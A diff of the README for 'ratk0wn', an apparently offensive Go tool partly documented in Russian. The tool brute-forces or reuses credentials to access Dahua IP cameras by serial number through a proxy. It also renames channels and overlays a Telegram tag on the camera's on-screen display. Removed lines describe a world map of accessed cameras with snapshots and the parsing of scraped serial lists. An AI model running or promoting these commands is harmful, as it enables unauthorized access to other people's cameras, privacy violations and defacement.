@@ -47,9 +47,6 @@ go build -o ratk0wn .
 ./ratk0wn -i creds_ready.txt -t 100 -s --socks5 127.0.0.1:1080
 ```
 
-любой входной файл парсится на серийники сам — можно кидать чужой xml-экспорт SmartPSS,
-копипасту с форумов, сырой текст: ratk0wn выцепит все dahua s/n и префиксы.
-
 ### Prefix scan
 
 ```bash
@@ -58,14 +55,6 @@ go build -o ratk0wn .
 
 # префикс с кредами
 ./ratk0wn -i "XXXXXXXXXX:admin:admin" -t 100 -s
-```
-
-### web dashboard
-
-```bash
-# live-карта по миру: точки камер, гео по ip, снапшоты, copy all
-# включён по умолчанию на 127.0.0.1:7575, свой порт:
-./ratk0wn -i creds_ready.txt -t 100 -s --web 3000
 ```
 
 ## config.toml
@@ -135,8 +124,6 @@ memo = "@skver303"
 osd = true
 channel = "ratkown"           # channel rename
 color_mode = "rainbow"         # colorful osd text (on old devices)
-picture = false               # bmp logo watermark over video
-picture_file = "logo.bmp"     # 128x128 8-bit indexed recommended
 custom = [
     "t.me/ratkown",
     "second line",               # you can do only 5 slots
